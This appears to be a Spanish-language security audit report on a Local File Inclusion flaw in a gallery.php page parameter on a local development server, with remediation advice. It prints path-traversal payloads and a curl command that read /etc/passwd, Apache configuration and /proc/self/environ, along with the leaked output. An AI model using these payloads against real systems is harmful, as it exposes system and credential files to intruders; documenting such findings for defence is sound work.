# Informe de auditoría LFI - http://web.dev.local:8081

## Resumen ejecutivo

Se identificó una vulnerabilidad de **Local File Inclusion (LFI)** explotable en el endpoint:

- `http://web.dev.local:8081/gallery.php?page=...`

El parámetro `page` acepta secuencias de path traversal y permite incluir/leer archivos locales del sistema. La vulnerabilidad fue explotada con éxito para leer archivos sensibles del host, incluyendo:

- `/etc/passwd`
- `/etc/hostname`
- `/etc/apache2/apache2.conf`

Adicionalmente, al intentar acceder a `/proc/self/environ`, la aplicación expuso mensajes de error de PHP que revelan la ruta interna del código vulnerable:

- `/var/www/html/gallery.php`
- línea `104`

## Alcance y metodología

Se realizó reconocimiento del sitio raíz y de las rutas enlazadas desde la página principal. Posteriormente se identificó el parámetro `page` como superficie candidata a LFI y se probaron cargas legítimas, valores inexistentes y payloads de traversal.

## Hallazgo principal

### 1. Local File Inclusion en `gallery.php?page`

**Severidad:** Alta

**URL vulnerable:**

```text
http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
```

**Descripción:**

La aplicación usa el parámetro `page` para cargar contenido dinámico sin restringir correctamente la ruta solicitada. Esto permite escapar del directorio previsto e incluir archivos arbitrarios presentes en el sistema local.

## Evidencia de explotación

### Lectura de `/etc/passwd`

Payload:

```text
http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
```

Respuesta observada:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Lectura de `/etc/hostname`

Payload:

```text
http://web.dev.local:8081/gallery.php?page=../../../../etc/hostname
```

Respuesta observada:

```text
d5054e367753
```

### Lectura de `/etc/apache2/apache2.conf`

Payload:

```text
http://web.dev.local:8081/gallery.php?page=../../../../etc/apache2/apache2.conf
```

Respuesta observada:

```text
# This is the main Apache server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See http://httpd.apache.org/docs/2.4/ for detailed information about
...
```

### Divulgación de ruta interna del servidor

Payload:

```text
http://web.dev.local:8081/gallery.php?page=../../../../proc/self/environ
```

Respuesta observada:

```text
Warning: include(/proc/789/environ): Failed to open stream: Permission denied in /var/www/html/gallery.php on line 104
Warning: include(): Failed opening '../../../../proc/self/environ' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/gallery.php on line 104
```

Esto confirma:

- inclusión directa de rutas controladas por el usuario
- exposición de errores internos de PHP
- ubicación del archivo vulnerable: `/var/www/html/gallery.php`

## Impacto

Un atacante remoto no autenticado podría:

- leer archivos sensibles del sistema operativo
- obtener información de configuración del servidor web
- revelar rutas internas de la aplicación
- facilitar ataques posteriores contra credenciales, configuración o componentes desplegados

Dependiendo de archivos adicionales disponibles y configuración del entorno, este tipo de LFI podría servir como paso previo a compromisos más graves.

## Reproducción mínima

Ejemplo con `curl`:

```bash
curl -s 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'
```

Indicador esperado:

```text
root:x:0:0:root:/root:/bin/bash
```

## Recomendaciones

1. Eliminar la inclusión dinámica basada en entrada de usuario sin validación.
2. Sustituir `page` por una lista blanca de identificadores válidos, por ejemplo: `modern`, `classic`, `abstract`, `about`.
3. Resolver el contenido mediante un mapeo fijo en servidor, sin concatenar rutas controladas por el usuario.
4. Validar con `realpath()` y verificar que la ruta final permanezca dentro de un directorio permitido, si el patrón de archivos dinámicos es imprescindible.
5. Desactivar la visualización de errores en producción (`display_errors=Off`) y registrar fallos únicamente en logs internos.
6. Revisar permisos del sistema y exposición de archivos sensibles en el host.

## Conclusión

La aplicación es **vulnerable a Local File Inclusion** a través del parámetro `page` de `gallery.php`. La vulnerabilidad fue **explotada con éxito** para leer archivos locales del sistema y obtener información sensible del entorno.
